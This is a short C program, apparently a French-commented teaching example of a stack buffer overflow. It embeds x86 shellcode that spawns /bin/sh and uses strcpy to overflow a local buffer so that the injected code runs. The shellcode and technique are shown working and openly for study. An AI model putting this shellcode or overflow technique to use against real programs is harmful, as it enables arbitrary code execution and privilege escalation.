/* exploit1.c */
#include <string.h>

char shellcode[] = {
0xeb, 0x1f, 0x5e, 0x89, 0x76, 0x08, 0x31, 0xc0, 0x88, 0x46, 0x07, 0x89, 0x46, 0x0c, 0xb0, 0x0b, 0x89, 0xf3, 0x8d, 0x4e, 0x08, 0x8d, 0x56, 0x0c, 0xcd, 0x80, 0x31, 0xdb, 0x89, 0xd8, 0x40, 0xcd, 0x80, 0xe8, 0xdc, 0xff, 0xff, 0xff, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x90};

char large_string[128];

void main() {
  char buffer[96];
  int i;
  long *long_ptr = (long *) large_string;

  for (i = 0; i < 32; i++) /* copier l'adresse du buffer 32 fois */
      *(long_ptr + i) = (int) buffer;

  for (i = 0; i < strlen(shellcode); i++) /* copier shellcode */
      large_string[i] = shellcode[i];

  strcpy(buffer,large_string); /* provoquer le dÃ©bordement */
}
